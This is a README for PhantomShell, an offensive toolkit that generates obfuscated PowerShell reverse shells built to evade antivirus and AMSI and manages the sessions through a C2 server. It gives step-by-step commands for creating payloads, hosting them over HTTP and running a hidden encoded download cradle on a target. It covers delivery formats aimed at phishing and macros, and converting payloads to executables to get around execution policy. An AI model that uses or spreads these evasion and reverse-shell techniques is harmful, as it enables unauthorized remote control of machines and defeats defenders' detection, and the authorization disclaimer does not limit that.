# 👻 PhantomShell

<img width="1024" height="1024" alt="PhantomShell" src="https://github.com/user-attachments/assets/bd3b82fc-85bd-4651-b1f8-1b2a908b403a" />


### Advanced PowerShell AV / AMSI Evasion Framework + Enterprise C2 Server

Red-team framework designed for **authorized penetration testing and adversary simulation**.

PhantomShell combines an **advanced PowerShell payload generator** with a **lightweight Command & Control (C2) infrastructure**, enabling red-team operators to generate payloads, host them, and manage reverse shell sessions.

</div>

---

# 👻 What is PhantomShell?

PhantomShell generates **obfuscated, base64-encoded PowerShell reverse shells** designed to evade **signature-based antivirus detection and AMSI scanning**.

It automates tasks such as:

- variable obfuscation
- payload encoding
- multi-layer execution wrapping
- hiding IP and port values
- HTTP payload delivery
- polymorphic payload generation

All from **one command-line tool**.

---

# 🔍 Is PhantomShell Undetectable?

No tool can guarantee that.

PhantomShell helps evade **signature-based detection**, but it cannot bypass every defensive mechanism.

| Technique | What it helps evade | What it cannot evade |
|----------|--------------------|----------------------|
| Variable renaming | static signatures | behavioral detection |
| Base64 encoding | plain-text scanning | runtime AMSI |
| Multi-layer wrapping | shallow analysis | deep sandboxing |
| IP hiding | simple pattern matching | network monitoring |
| Polymorphism | hash detection | AI behavioral EDR |

Best evasion profile:

```
--obf-profile random
--layers 3
--enc-b64
```

---

# 🚀 Features

## ⚡ Payload Generation

- multi-layer PowerShell encoding
- AMSI-aware payload structure
- polymorphic payload generation
- randomized variable names
- multiple delivery formats

## 🎮 Command & Control

- lightweight Python C2 server
- CLI operator shell
- web dashboard
- multi-session handling
- remote command execution

## 🎯 Red Team Usage

- reverse shell generation
- HTTP payload hosting
- polymorphic payload variants
- session monitoring

---

# 🏗 Architecture

```
Target Machine
      │
      │ Reverse Shell
      ▼
PhantomShell C2 Server
      │
      ├── CLI Interface
      │
      └── Web Dashboard
```

---

# ⚙ Installation

No external dependencies.

```bash
git clone https://github.com/adrilaw/PhantomShell.git

cd PhantomShell

chmod +x phantomshell.py

chmod +x phantomc2.py

python3 phantomc2.py --help

python3 phantomshell.py --help
```

---

# 🚀 Quick Start

### Terminal 1 — Start C2 server

```bash
python3 phantomc2.py --port 4444 --web-port 8080 --password RedTeam2026
```
<img width="1845" height="907" alt="image" src="https://github.com/user-attachments/assets/59b5f901-8dfa-43c6-8555-29e55b53ca7b" />

## For more information on the Phantom C2 use the command below

```bash
python3 phantomc2.py --port 4444 --help
```
---

### Terminal 2 — Generate payload

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
```
<img width="1920" height="997" alt="Screenshot_20260317_120257" src="https://github.com/user-attachments/assets/fc85d30a-9fd3-46fe-9f07-08f9692deeaa" />

Run the generated command on the Windows target.

Shell connects back to Terminal 1.

---

# 💾 Payload Generating Command Reference

### Terminal 2 — Generate Payload

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
```

Copy the output and run it on the target Windows machine.

---

# 📖 Command Reference

## `revshell` — Standalone Payload

```bash
python3 phantomshell.py revshell -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Short | Description | Default |
|-----|------|-------------|--------|
| `--attacker-ip` | `-i` | attacker IP | required |
| `--port` | `-p` | listening port | required |
| `--obf-profile` | `-o` | minimal/aggressive/random | aggressive |
| `--layers` | `-l` | encoding layers | 1 |
| `--format` | `-f` | payload format | powershell |
| `--enc-b64` | | hide IP and port | off |
| `--keep-pwd` | | show CWD | off |
| `--do-not-hide` | | disable hidden flags | off |
| `--verbose` | `-v` | verbose output | off |

---

## Examples

Basic payload

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
```

Maximum evasion

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -o random -l 3 --enc-b64
```

HTA payload

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f hta -l 2
```

CMD wrapper

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f cmd
```

Verbose mode

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -v
```

---

# 🌐 `server` — HTTP Payload Hosting

Starts an HTTP server and prints a download cradle.

```bash
python3 phantomshell.py server -i <IP> -p <PORT>
```

| Flag | Description | Default |
|-----|-------------|--------|
| `-i` | attacker IP | required |
| `-p` | reverse shell port | required |
| `--server-port` | HTTP port | 8000 |
| `-o` | payload filename | random |
| `--layers` | encoding layers | 1 |
| `--enc-b64` | hide IP/port | off |

---

Example:

```bash
python3 phantomshell.py server -i 10.10.10.5 -p 4444
```

Target execution:

```powershell
powershell -NoP -sta -NonI -W Hidden -enc <CRADLE>
```

---

# 🔄 `polymorph` — Polymorphic Payload Generator

Generate multiple unique payload variants.

```bash
python3 phantomshell.py polymorph -i <IP> -p <PORT>
```

Example:

```bash
python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 5
```

Output example

```
Variant 1 profile=minimal FP:B0CCA4CD
Variant 2 profile=aggressive FP:06F530B1
Variant 3 profile=random FP:A273D56F
```

---

# 🎯 Obfuscation Profiles

### minimal

```
$client → $c
$stream → $st
$bytes → $b
```

Fast and readable.

---

### aggressive

```
$client → $xA1
$stream → $xB2
$bytes → $xC3
```

Default profile.

---

### random

```
$client → $mKpRx
$stream → $zQ6v8A6
$bytes → $hySOJ
```

Different every run.

---

# 🧅 Encoding Layers

| Layer | Description |
|------|-------------|
| 1 | utf-16le base64 |
| 2 | base64 wrapped in IEX |
| 3 | multi-stage base64 decoding |

Payload is verified before output.

---

# 📦 Output Formats

| Format | Usage |
|------|------|
| powershell | direct execution |
| cmd | cmd injection |
| hta | phishing |
| vbs | macro delivery |
| mshta | one-liner execution |

---

# 🎯 Example Attack Workflow

```
# Listener
python3 phantomc2.py --port 4444 --web-port 8080 --password RedTeam2026

# Generate payload
python3 phantomshell.py server -i 10.10.10.5 -p 4444 -l 2

# Execute on target
powershell -NoP -sta -NonI -W Hidden -enc <payload>
```
# 🪟 Building the Executable

Follow these steps to generate a payload and convert it into a standalone Windows executable (.exe):

1. Generate the Script
Use PhantomShell to generate your initial code. Ensure the output is configured correctly for your target environment.


3. Save as PowerShell
Once the code is generated, copy and save it into a new text file.


### Important: You must save the file with the .ps1 extension (e.g., payload.ps1).

3. Convert to Executable (.exe)
To make the script portable and bypass certain execution policy restrictions, convert it using the PowerShell to exe/msi Converter.

Download Tool: PowerShell to exe/msi Converter (Microsoft Store)

# Steps:

### 1.Open the converter application.

### 2.Select your .ps1 file as the source.

### 3.Click the Build button to generate the .exe file.

### 4.The resulting file can now be run on Windows systems by double-clicking the icon.

---

# 🛡 Security Considerations

Use only in **authorized environments**.

Recommended:

- firewall restrictions
- HTTPS proxy
- strong authentication
- infrastructure rotation
- log monitoring

---

# ⚠ Legal Disclaimer

This software is intended **only for authorized cybersecurity testing**.

Unauthorized use may violate computer crime laws.

The author assumes **no liability for misuse**.

---

# 📝 License
PhantomShell is licensed under the [GNU General Public License](LICENSE) and the [PhantomShell Commercial License](C-LICENSE)- see the LICENSE file for details.


# 👨‍💻 Author

**Dodin Mel Adrien Lawrence Enzo**

Offensive Security | Red Teaming

LinkedIn  
https://www.linkedin.com/in/dodin-mel-adrien-lawrence-enzo-5568b91b5/

Twitter  
https://twitter.com/AdrienDodin

---

⭐ If this project helped you, consider starring the repository.

**PhantomShell** | © 2026 RedParakeet Security Team | All Rights Reserved
